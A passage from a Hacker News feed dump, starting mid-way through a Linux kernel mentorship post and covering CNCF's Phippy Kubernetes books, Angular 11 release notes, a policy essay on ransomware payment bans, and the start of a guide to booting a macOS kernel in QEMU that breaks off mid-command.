that the proposed fix wasn’t the right way to handle the bug. The
discussion also concluded that many other usages of
usb_control_msg(), which don’t have proper error checks, are also
prone to similar bugs. I fixed the bug by adding an adequate error
check to prevent short reads in the caller, and Greg KH wrote new
wrapper functions for usb_control_msg() to be used in such scenarios
to avoid similar bugs.</p><p>Apart
from this bug, I also explored two other bugs. I found them
fascinating because inspite of being listed on the dashboard, their
reproducers weren’t triggering any issues. I learned that a commit
had fixed one of these bugs, and it was yet to be applied to all
kernel trees. But the other bug didn’t have any reported fix, yet the
reproducer wasn’t triggering the issue. I discussed this with the
mentor and learned that the syzbot dashboard isn’t quite dynamic. So
we decided to mark the bug as “invalid.” On a later
discussion with other community members I learned that it was not a
good idea, and I’ve ended up marking a potentially valid bug as
“invalid”!</p><p>As
a follow-up work on the first usb_control_msg() bug, I submitted a
cleanup patch series for some of the drivers/net/usb files. One of
those patches ignored the GFP_NOIO flag used in the original code and
replaced it with the GFP_KERNEL flag used in the new wrapper API
functions. It was a blunder that resulted in a discussion to add a
new argument for memory allocation flags in the wrapper functions.
Now the wrapper functions take memory flags as arguments preventing
mentees like me from repeating such blunders.</p><p>I
continued the follow-up work by investigating drivers/usb/serial/
files. I noticed that many usages of usb_control_msg() rely on its
return value of the number of bytes read/wrote. And the new wrapper
functions don’t retain that information. So I had a discussion with
the mentor about if that information was really necessary. We
concluded that it is almost always unnecessary, and having an error
code returned is a better way.</p><p>I
ended up submitting 19 patches as part of the mentorship program. The
first one is a fix for the usb_control_msg() short read bug. The next
three are cleanup patches for usb_control_msg() wrapper functions for
drivers/net/usb files, which were rejected because of the memory flag
blunder. And the remaining 15 are usb_control_msg() cleanup patches
for drivers/usb/serial/ files. Greg KH has reviewed them, but they
are not yet merged in the mainline.</p><p>Apart
from the bug fixing, I also learned few other interesting things
about the Linux kernel and its developer community, like how we test
various changes in the kernel and why we strictly use plain text
emails. I also attended talks at the Linux Plumber’s Conference and
the Open Source Summit Europe during the mentorship, which helped me
catch up with what is happening in the kernel world, learn new
things, and make new connections.</p><p>
My
mentorship program experience has been fantastic, and I recommend it
to everyone interested in pursuing Linux kernel development and
looking for mentoring. I am heartily thankful to my mentor Greg KH,
Shuah Khan, and The Linux Foundation, for providing me with this
opportunity and a great learning experience. 
</p><p>Patches can be found on&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flore.kernel.org%2Flkml%2F%3Fq%3Dhimadrispandya&amp;t=ZDVkMWU5NzViM2JhMjRlZWVjMjA2MmI2MTBmYzAxYWUwMDk3NDVjNyxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605443209" target="_blank"> https://lore.kernel.org/lkml/?q=himadrispandya.<br></a></p>
                    </article></div>]]>
            </description>
            <link>https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065177</guid>
            <pubDate>Thu, 12 Nov 2020 01:13:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Illustrated Children's Guide to Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065144">thread link</a>) | @tomasreimers
<br/>
November 11, 2020 | https://www.cncf.io/phippy/ | <a href="https://web.archive.org/web/*/https://www.cncf.io/phippy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<article>
		
<div><figure><img loading="lazy" width="472" height="487" src="https://www.cncf.io/wp-content/uploads/2020/07/phippy-01-1.svg" alt=""></figure><p><strong>Phippy</strong>&nbsp;is a simple PHP app, trying to find a home in a cloud native world.</p></div>







<div><div>




<h2>Introducing Phippy and friends</h2>












</div></div>







<div>
<div>
<figure><img loading="lazy" width="849" height="651" src="https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes.jpg 849w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-300x230.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-768x589.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-261x200.jpg 261w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-700x537.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-222x170.jpg 222w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-352x270.jpg 352w, https://www.cncf.io/wp-content/uploads/2020/07/The-Illustrated-Childrens-Guide-to-Kubernetes-443x340.jpg 443w" sizes="(max-width: 849px) 100vw, 849px"></figure>




</div>



<div>
<h3>The Illustrated Children’s Guide to Kubernetes</h3>



<p><em>The Illustrated Children’s Guide to Kubernetes</em> is a simple, gentle answer a father gave his daughter when she inquisitively asked about Kubernetes. It’s dedicated to all the parents who try to explain software engineering to their children.</p>



<p>The star of <em>The Illustrated Children’s Guide to Kubernetes</em>, Phippy and her friends explain the core concepts of Kubernetes in simple terms.</p>




</div>
</div>







<div>
<div>
<h3>Phippy Goes to the Zoo</h3>



<p>Follow the tale of Phippy and her niece Zee as they take an educational trip to the Kubernetes Zoo.</p>








</div>



<div>
<figure><img loading="lazy" width="851" height="655" src="https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo.jpg 851w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-300x231.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-768x591.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-260x200.jpg 260w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-700x539.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-221x170.jpg 221w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-351x270.jpg 351w, https://www.cncf.io/wp-content/uploads/2020/07/Phippy-Goes-to-the-Zoo-442x340.jpg 442w" sizes="(max-width: 851px) 100vw, 851px"></figure>
</div>
</div>







<div>
<div>
<h3>Phippy and Zee go to the Mountains</h3>



<p>Another work featuring Phippy and friends: Join Phippy and Zee on a 4-dimensional hike!</p>




</div>



<div>
<figure><img loading="lazy" width="1024" height="768" src="https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-1024x768.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-1024x768.jpg 1024w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-300x225.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-768x576.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-267x200.jpg 267w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-700x525.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-227x170.jpg 227w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-360x270.jpg 360w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8-453x340.jpg 453w, https://www.cncf.io/wp-content/uploads/2020/07/58668004-dd6c3c80-82f4-11e9-90e3-00b6580c27e8.jpg 1367w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>
</div>







<div>
<div>
<h3>Phippy In Space: Adventures in Cloud-Native Recovery</h3>



<p>In the not-so-distant future, space outposts (cloud-native infrastructure) are the next frontier for settlement and Captain Kube is in charge of the cutting-edge Mars outpost. As the outpost has grown in size and complexity, Captain Kube needs to find solutions for many of the settlement’s growing pains. He has recruited Phippy to work with him on the outpost’s Day 2 challenges.</p>



<p>Join them on their adventure, as they journey to Mars and brainstorm solutions.</p>




</div>



<div>
<figure><img loading="lazy" width="1024" height="792" src="https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1024x792.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1024x792.jpg 1024w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-300x232.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-768x594.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-1536x1187.jpg 1536w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-259x200.jpg 259w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-700x541.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-220x170.jpg 220w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-349x270.jpg 349w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space-440x340.jpg 440w, https://www.cncf.io/wp-content/uploads/2020/09/Phippy-In-Space.jpg 1568w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>
</div>















<p>The characters Phippy, Captain Kube, Goldie, and Zee and the two books are owned by The Linux Foundation, on behalf of the Cloud Native Computing Foundation, and licensed under the Creative Commons Attribution License (<a href="https://creativecommons.org/licenses/by/4.0/">CC-BY</a>), which means that you can remix, transform, and build upon the material for any purpose, even commercially. If you use the characters, please include the text “<a href="https://phippy.io/">phippy.io</a>” to provide attribution (and online, please include a link to&nbsp;<a href="https://phippy.io/">https://phippy.io</a>).</p>



<p>The characters and the two books were created by&nbsp;<a href="https://twitter.com/technosophos">Matt Butcher</a>,&nbsp;<a href="https://twitter.com/karenhchu">Karen Chu</a>, and&nbsp;<a href="https://www.baileyjeanstudio.com/">Bailey Beougher</a>&nbsp;and donated by Microsoft to CNCF. Goldie is based on the Go Gopher, created by&nbsp;<a href="https://blog.golang.org/gopher">Renee French</a>, which is also licensed under&nbsp;<a href="https://creativecommons.org/licenses/by/3.0/" target="_blank" rel="noreferrer noopener">CC-BY</a>.</p>



<p>Images of Phippy, Captain Kube, Goldie, and Zee are available in the CNCF&nbsp;<a href="https://github.com/cncf/artwork/blob/master/examples/other.md#phippy--friends-group-logos">artwork</a>&nbsp;repo in svg and png formats and in color, black, and white.</p>
	</article>
</div></div>]]>
            </description>
            <link>https://www.cncf.io/phippy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065144</guid>
            <pubDate>Thu, 12 Nov 2020 01:10:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Version 11 of Angular Now Available]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25065091">thread link</a>) | @mgechev
<br/>
November 11, 2020 | https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7 | <a href="https://web.archive.org/web/*/https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@markathompson?source=post_page-----74721b7952f7--------------------------------" rel="noopener"><img alt="Mark Techson" src="https://miro.medium.com/fit/c/96/96/1*2hqK0rVXWghtk_RLFx33oA.jpeg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Photo of a Torch Ginger by Jules Kremer" src="https://miro.medium.com/max/2368/0*55kr1t601sp22pkE" width="1184" height="1091" srcset="https://miro.medium.com/max/552/0*55kr1t601sp22pkE 276w, https://miro.medium.com/max/1104/0*55kr1t601sp22pkE 552w, https://miro.medium.com/max/1280/0*55kr1t601sp22pkE 640w, https://miro.medium.com/max/1400/0*55kr1t601sp22pkE 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*55kr1t601sp22pkE?q=20"></p></div></div></div><figcaption>Photo of a Torch Ginger by Jules Kremer</figcaption></figure><p id="1feb"><strong>Welcome to the Angular version 11 release.</strong></p><p id="1877">Version 11.0.0 is here and we’ve got some great updates for Angular developers everywhere. This release has updates across the platform including the framework, the CLI and components. Let’s dive in!</p><h2 id="1182">Updates on Operation Byelog</h2><p id="593b">When we shared <a href="https://angular.io/guide/roadmap" rel="noopener">Angular’s Roadmap</a>, one of the items was Operation Byelog where we committed to putting a significant engineering effort towards triaging issues and PRs until we have a clear understanding of the broader community needs. We can now report that the original goal is complete! We’ve triaged all the issues in all three of the monorepos and will continue this as an ongoing effort as new issues get reported.</p><p id="bc06">This is our commitment: Going forward all new issues reported will be triaged within 2 weeks.</p><p id="2104">In the process, we resolved a few <a href="https://github.com/angular/angular/issues/12842" rel="noopener">popular</a> <a href="https://github.com/angular/angular/issues/18469" rel="noopener">issues</a> in the <a href="https://github.com/angular/angular/issues/13011" rel="noopener">router</a> and <a href="https://github.com/angular/angular/issues/14542" rel="noopener">forms</a>.</p><p id="a1cd">Also, we’ve closed the <a href="https://github.com/angular/angular/issues/11405" rel="noopener"><em>third most popular issue</em></a><em>!</em></p><p id="5773">Now, we’re planning the next steps to support the Angular community. We’ll continue triaging and fixing issues, and work towards improving our processes for accepting community contributions.</p><h2 id="4683">Automatic Inlining of Fonts</h2><p id="6a67">To make your apps even faster by speeding up their <a href="https://web.dev/first-contentful-paint/" rel="noopener">first contentful paint</a>, we’re introducing automatic font inlining. During compile time Angular CLI will download and inline fonts that are being used and linked in the application. We enable this by default in apps built with version 11. All you need to do to take advantage of this optimization is update your app!</p><h2 id="124e">Component Test Harnesses</h2><p id="78d2">In Angular v9 we introduced Component Test Harnesses. They provide a robust and legible API surface to help with testing Angular Material components. It gives developers a way to interact with Angular Material components using the supported API during testing.</p><p id="2932">Releasing with version 11, we have harnesses for all of the components! Now developers can create more robust test suites.</p><p id="3e07">We’ve also included performance improvements and new APIs. The <em>parallel</em> function makes working with asynchronous actions in your tests easier by allowing developers to run multiple asynchronous interactions with components in parallel. The <em>manualChangeDetection</em> function gives developers access to finer grained control of change detection by disabling automatic change detection in unit tests.</p><p id="752c">For more details and examples of these APIs and other new features, be sure to check out the <a href="http://material.angular.io/cdk/test-harnesses/overview" rel="noopener">documentation for Angular Material</a> Test Harnesses!</p><h2 id="173a">Improved Reporting and Logging</h2><p id="968c">We’ve made changes to the builder phase reporting to make it even more helpful during development. We are bringing in new CLI output updates to make logs and reports easier to read.</p><figure><div><div><p><img alt="Screenshot of angular CLI output nicely formatted into columns." src="https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX" width="607" height="355" srcset="https://miro.medium.com/max/552/0*-dCa80651cnfbjpX 276w, https://miro.medium.com/max/1104/0*-dCa80651cnfbjpX 552w, https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX 607w" sizes="607px" data-old-src="https://miro.medium.com/max/60/0*-dCa80651cnfbjpX?q=20"></p></div></div><figcaption>Improved CLI output formatting</figcaption></figure><h2 id="970e">Updated Language Service Preview</h2><p id="650a">The Angular Language Service provides helpful tools to make development with Angular productive and fun. The current version of the language service is based on View Engine and today we’re giving a sneak peek of the Ivy-based language service. The updated language service provides a more powerful and accurate experience for developers.</p><p id="15e6">Now, the language service will be able to correctly infer generic types in templates the same way the TypeScript compiler does. For example, in the screenshot below we’re able to infer that the iterable is of type string.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Screenshot of intellisense style insights in Angular templates." src="https://miro.medium.com/max/3000/0*L1Tg13gdu3PCqUNN" width="1500" height="902" srcset="https://miro.medium.com/max/552/0*L1Tg13gdu3PCqUNN 276w, https://miro.medium.com/max/1104/0*L1Tg13gdu3PCqUNN 552w, https://miro.medium.com/max/1280/0*L1Tg13gdu3PCqUNN 640w, https://miro.medium.com/max/1400/0*L1Tg13gdu3PCqUNN 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*L1Tg13gdu3PCqUNN?q=20"></p></div></div></div><figcaption>Angular Language Service inferring iterable types in templates</figcaption></figure><p id="e67f">This powerful new update is still in development but we wanted to share an update as we keep preparing it for a full release in an upcoming version.</p><h2 id="48a5">Updated Hot Module Replacement (HMR) Support</h2><p id="303f">Angular has offered support for HMR but enabling it required configuration and code changes making it less than ideal to quickly include in Angular projects. In version 11 we’ve updated the CLI to allow enabling HMR when starting an application with ng serve. To get started, run the following command:</p><pre><span id="3ac4">ng serve --hmr</span></pre><p id="f3bc">After the local server starts the console will display a message confirming that HMR is active:</p><p id="f521">NOTICE: Hot Module Replacement (HMR) is enabled for the dev server.</p><p id="5155">See <a href="https://webpack.js.org/guides/hot-module-replacement" rel="noopener">https://webpack.js.org/guides/hot-module-replacement</a> for information on working with HMR for webpack.</p><p id="3796">Now during development the latest changes to components, templates and styles will be instantly updated into the running application. All without requiring a full page refresh. Data typed into forms are preserved as well as scroll position providing a boost to developer productivity.</p><h2 id="6de3">Faster Builds</h2><p id="630c">We’re bringing a faster development and build cycle by making updates to some key areas.</p><ul><li id="4336">When installing dependencies, the ngcc update process is now 2–4x faster.</li><li id="b30d">Faster compilation with TypeScript v4.0.</li></ul><p id="ed18">Now, teams can opt-in to webpack v5. Currently, you could experiment with <a href="https://webpack.js.org/concepts/module-federation/" rel="noopener">module federation</a>. In the future, webpack v5 will clear the path for:</p><ul><li id="db89">Faster builds with persistent disk caching</li><li id="7ab4">Smaller bundles thanks to <a href="https://webpack.js.org/guides/tree-shaking/" rel="noopener">cjs tree-shaking</a></li></ul><p id="dae8">Support is experimental and under development so we don’t recommend opting in for production uses.</p><p id="4ca8">Want to try out webpack 5? To enable it in your project, add the following section to your package.json file:</p><pre><span id="386c">"resolutions": {<br>     "webpack": "5.4.0"<br>}</span></pre><p id="65a0">Currently, you’ll need to use <strong>yarn</strong> to test this as npm does not yet support the resolutions property.</p><h2 id="d0a9">Linting</h2><p id="e4b2">In previous versions of Angular, we’ve shipped a default implementation for linting (TSLint). Now, TSLint is deprecated by the project creators who recommend migration to ESLint. <a href="https://twitter.com/mrjameshenry" rel="noopener">James Henry</a> together with other folks from the open-source community developed a third-party solution and migration path via <a href="https://github.com/typescript-eslint/typescript-eslint" rel="noopener">typescript-eslint</a>, <a href="https://github.com/angular-eslint/angular-eslint" rel="noopener">angular-eslint</a> and <a href="https://github.com/typescript-eslint/tslint-to-eslint-config" rel="noopener">tslint-to-eslint-config</a>! We’ve been collaborating closely to ensure a smooth transition of Angular developers to the supported linting stack.</p><p id="6071">We’re deprecating the use of TSLint and Codelyzer in version 11. This means that in future versions the default implementation for linting Angular projects will not be available.</p><p id="806d">Head over to the <a href="https://github.com/angular-eslint/angular-eslint#migrating-from-codelyzer-and-tslint" rel="noopener">official project page</a> for a guide to incorporate angular-eslint in a project and migrate from TSLint.</p><h2 id="98a6">Housekeeping</h2><p id="0727">In this update we’re removing support for IE9/IE10 and IE mobile. IE11 is the only version of IE <a href="https://angular.io/guide/browser-support" rel="noopener">still supported</a> by Angular. We’ve also <a href="https://angular.io/guide/deprecations" rel="noopener">removed deprecated APIs</a> and added a few to the deprecation list. Be sure to check this out to make sure you are using the latest APIs and following our recommended best practices.</p><h2 id="a3c7">Roadmap</h2><p id="9aad">We’ve also updated the <a href="https://angular.io/guide/roadmap" rel="noopener">roadmap</a> to keep you posted on our current priorities. Some of the announcements in this post are updates on in-progress projects from the roadmap. This reflects our approach to incrementally rollout larger efforts and allows developers to provide early feedback that we can incorporate it into the final release.</p><p id="8c07">We collaborated with <a href="https://twitter.com/simpulton" rel="noopener">Lukas Ruebbelke</a> from the Angular community on updating the content of some of the projects to better reflect the value they provide to developers.</p><h2 id="6939">How to update to get version 11</h2><p id="0170">When you are ready to go run this command to update Angular and CLI:</p><pre><span id="5983">ng update @angular/cli @angular/core</span></pre><p id="ac5f">Head over to <a href="https://update.angular.io/" rel="noopener">update.angular.io</a> to find detailed information and guidance on updating. We always recommend upgrading one major release at a time to have the best update experience.</p><p id="732f">We hope you enjoy this feature update and be sure to let us know what you think here or on <a href="https://twitter.com/angular" rel="noopener">Twitter</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065091</guid>
            <pubDate>Thu, 12 Nov 2020 01:06:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ransomware Prohibition]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065057">thread link</a>) | @SCHiM
<br/>
November 11, 2020 | https://gru.gq/2020/10/18/ransomware-prohibition/ | <a href="https://web.archive.org/web/*/https://gru.gq/2020/10/18/ransomware-prohibition/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><main><article itemscope="" itemtype="https://schema.org/CreativeWork"><div itemprop="text"><h2>Theres nothing that can’t be made worse</h2>
<p><a href="https://home.treasury.gov/policy-issues/financial-sanctions/recent-actions/20201001">The Treasury has moved to prohibit payment of ransomware ransoms</a>. They’ve said there will be some exceptions, and it is obvious that this won’t be an effective complete global ban on payment. The result, a partial ban on payment, is the worst possible ransomware environment for victims. The impact of different legal regimes governing ransom payments are well documented and understood, <a href="https://rusi.org/publication/occasional-papers/closing-gap-assessing-responses-terrorist-related-kidnap-ransom">see RUSI here</a>.</p>
<p>Banning ransomware payments seems like a means of removing the financial reward for the gangs. It makes intuitive sense that if the victims cannot pay, then the gangs will stop using ransomware. Unfortunately the counterintuitive truth is that an incomplete, ineffective, partial ban will actually make objectively ransomware worse for everyone.</p>
<p>If there is a complete universal global ban, then ransomware ceases to be a source of money and the ransomware gangs stop. Or at least migrate to something else that makes money. We know this scenario is not going to happen.</p>
<h3>What’s the worst that can happen?</h3>
<p>A partial ban creates significant unintended consequences. Firstly, the ransomware gangs still make money from ransomware, so they do <strong>not</strong> cease operations. Then, to encourage payment they become more drastic and extreme in their actions. They have to make a stronger incentive to encourage people who are dissuaded by the ban, but might pay if given sufficient “encouragement”. Then, because the prohibition on payment drives it underground – with all the limited transparency and brutal mechanisms for enforcing compliance — the ransom prices rise. This environment: higher prices, more aggressive ransomware gangs, fewer reputable companies negotiating and handling the ransom payments (and thereby managing the gangs); it is the worst possible situation for everyone.</p>
<h3>How to control attacker behaviour</h3>
<p>The only entity with power to control the behaviour of ransomware gangs is the one providing their protection. The gangs need a place to operate and somewhere to convert their crypto currency into hard currency. They are cashing out hundreds of thousands of dollars in crypto, and there is no way that isn’t raising “know your customer” alerts for money laundering.</p>
<p>The only controlling entity is the one that allows the gangs to operate. The gangs are completely at the mercy of whichever entity provides protection (yes, it’s Russia). This is the rule everywhere that kidnapping gangs operate, and ransomware gangs share this trait with kidnap&amp;ransom (K&amp;R) gangs with regards to their operational requirements.</p>
<h3>Private governance. Better than nothing? Hmm</h3>
<p>The current situation, where there is no criminalisation of payment has created a market place where a number of companies working with insurers are handling the vast majority of ransomware incidents. There are crisis responders who help the companies recover, who arrange a minimal payment, and who get paid by the insurers. This is market governance and it keeps the prices down because there is a sort of gentlemen’s agreement between the gangs and the payment companies. Also, the lack of prohibition means these companies operate in the open and they can share information about pricing etc internally and with each other. (Transparency)</p>
<p>The status quo is not the ideal world, but it is far better than the nightmare of ineffective partial prohibition.</p>
<div><p>Liked it? Take a second to support grugq on Patreon!</p><p><a rel="nofollow" target="_blank" href="https://www.patreon.com/oauth2/become-patron?response_type=code&amp;min_cents=100&amp;client_id=XPz53m5BPTmu-cnihK1RXoEaRoNywCco8VIPCNbwnAexV5YWdi_YG5Asup2LeG9p&amp;scope=identity%20identity[email]&amp;redirect_uri=https://gru.gq/patreon-authorization/&amp;state=eyJmaW5hbF9yZWRpcmVjdF91cmkiOiJodHRwczpcL1wvZ3J1LmdxXC8yMDIwXC8xMFwvMThcL3JhbnNvbXdhcmUtcHJvaGliaXRpb25cLyJ9&amp;utm_source=https%3A%2F%2Fgru.gq%2F2020%2F10%2F18%2Fransomware-prohibition%2F&amp;utm_medium=patreon_wordpress_plugin&amp;utm_campaign=457796&amp;utm_term=&amp;utm_content=post_unlock_button"><img src="https://i2.wp.com/gru.gq/wp-content/plugins/patron-button-and-widgets-by-codebard/images/become_a_patron_button.png?ssl=1" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/gru.gq/wp-content/plugins/patron-button-and-widgets-by-codebard/images/become_a_patron_button.png?ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p></div>
<!--<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://gru.gq/2020/10/18/ransomware-prohibition/"
    dc:identifier="https://gru.gq/2020/10/18/ransomware-prohibition/"
    dc:title="Ransomware Prohibition"
    trackback:ping="https://gru.gq/2020/10/18/ransomware-prohibition/trackback/" />
</rdf:RDF>-->
</div></article>
		

		
		

		</main></div></div></div></div>]]>
            </description>
            <link>https://gru.gq/2020/10/18/ransomware-prohibition/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065057</guid>
            <pubDate>Thu, 12 Nov 2020 01:01:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MacBook Air in Pure CSS]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064721">thread link</a>) | @ent101
<br/>
November 11, 2020 | https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css | <a href="https://web.archive.org/web/*/https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><nav role="navigation"><div><div><form action="/search" method="get"></form><p><img src="https://opimg.s3.amazonaws.com/e47219f7aa-200x200.jpg" id="app-toolbar-icon"></p><div id="app-options-wrapper"><div><div><p data-toggle="modal" data-target="#review-modal" id="reviews-modal-link" title="View reviews or write one"><span></span> <span>7</span></p></div></div></div></div><div id="navbar-user-items" aria-expanded="false"><p><a href="https://www.outpan.com/signup">Sign Up</a></p><ul><li></li></ul><ul><li><a href="https://www.outpan.com/">Home</a></li><li><a href="https://www.outpan.com/login?ref=https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css">Login</a></li><li><a href="https://www.outpan.com/signup">Sign Up</a></li></ul><form action="/search" method="get"></form></div></div></nav><div><div><div><div></div></div></div></div></div>]]>
            </description>
            <link>https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064721</guid>
            <pubDate>Thu, 12 Nov 2020 00:24:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Booting a macOS Apple Silicon Kernel in QEMU]]>
            </title>
            <description>
<![CDATA[
Score 254 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25064593">thread link</a>) | @empyrical
<br/>
November 11, 2020 | https://worthdoingbadly.com/xnuqemu3/ | <a href="https://web.archive.org/web/*/https://worthdoingbadly.com/xnuqemu3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I booted the arm64e kernel of macOS 11.0.1 beta 1 kernel in QEMU up to launchd. It’s completely useless, but may be interesting if you’re wondering how an Apple Silicon Mac will boot.</p>

<h2 id="howto">Howto</h2>

<p>This is similar to my previous guide on running <a href="https://worthdoingbadly.com/xnuqemu2/">iOS kernel in QEMU</a>:</p>

<ul>
  <li>install macOS 11.0.1 beta 1 (20B5012D)</li>
  <li>run <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/build_arm64e_kcache.sh"><code>build_arm64e_kcache.sh</code></a> to create an Apple Silicon Boot Kext Collection</li>
  <li>build the modified QEMU:
    <div><div><pre><code>git clone https://github.com/zhuowei/qemu
cd qemu
git checkout a12z-macos
mkdir build
cd build
../configure --target-list=aarch64-softmmu
make
</code></pre></div>    </div>
  </li>
  <li>create a modified device tree by running <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/FourthTry/DTRewriter.java">DTRewriter</a> on <a href="https://updates.cdn-apple.com/2020SummerSeed/fullrestores/001-30235/6D8C0CA3-5952-4FD8-AEB3-4B4CADB626BC/iPad8,11,iPad8,12_14.0_18A5332f_Restore.ipsw">iPad Pro firmware</a>:
    <div><div><pre><code>python3 extractfilefromim4p.py Firmware/all_flash/DeviceTree.j421ap.im4p DeviceTree_iPad_Pro_iOS_14.0_b3.devicetree
java DTRewriter DeviceTree_iPad_Pro_iOS_14.0_b3.devicetree DeviceTree_iPad_Pro_iOS_14.0_b3_Modified.dtb
</code></pre></div>    </div>
  </li>
  <li>run QEMU:
    <div><div><pre><code>./aarch64-softmmu/qemu-system-aarch64 -M virt -cpu max \
